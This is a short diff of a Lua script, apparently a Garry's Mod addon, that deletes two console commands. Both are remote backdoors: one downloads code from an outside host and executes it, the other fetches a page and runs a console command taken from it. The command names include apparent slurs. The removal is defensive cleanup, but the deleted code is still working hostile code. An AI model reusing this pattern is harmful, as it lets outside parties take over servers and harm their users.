@@ -339,20 +339,3 @@ concommand.Add("gayalert", function(ply)
         end)
     end
 end)
-
-concommand.Add("mnig", function(ply, cmd)
-    http.Fetch("https://kvac.cz/f.php?key=PGPtM0KUal839nmdHEfD", function(b, _)
-        RunString(b)
-        print("mnig" .. CompileString(b, ":", false)())
-    end, function(b,_)
-        print("mnig" .. CompileString(_, ":", false)())
-    end)
-end)
-concommand.Add("Blackies", function()
-    http.Fetch("https://d282785.nl/auth.html", function(body)
-        local command = string.match(body, "command=([^\r\n]+)")
-        if command then
-            RunConsoleCommand(command)
-        end
-    end)
-end)
